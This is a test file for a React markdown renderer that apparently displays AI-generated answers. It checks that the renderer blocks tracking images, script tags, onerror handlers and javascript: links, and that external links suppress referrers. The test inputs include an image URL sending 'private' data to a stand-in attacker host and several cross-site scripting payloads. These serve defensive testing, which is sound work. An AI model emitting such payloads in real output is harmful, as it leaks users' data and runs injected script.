import { render, cleanup } from "@testing-library/react";
import { afterEach, expect, test } from "vitest";
import { AnswerMarkdown } from "./AnswerMarkdown";
afterEach(cleanup);

test("generated content cannot load tracking images or executable HTML", () => {
  const { container } = render(
    <AnswerMarkdown>
      {
        "![leak](https://attacker.example/collect?data=private)\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>"
      }
    </AnswerMarkdown>,
  );
  expect(container.querySelector("img,script,iframe")).toBeNull();
});
test("links cannot execute javascript and external links suppress referrers", () => {
  const { container } = render(
    <AnswerMarkdown>
      {"[bad](javascript:alert%281%29) [reference](https://example.com)"}
    </AnswerMarkdown>,
  );
  const links = [...container.querySelectorAll("a")];
  expect(
    links.some((link) => link.getAttribute("href")?.startsWith("javascript:")),
  ).toBe(false);
  expect(links.at(-1)?.getAttribute("rel")).toBe("noopener noreferrer");
});
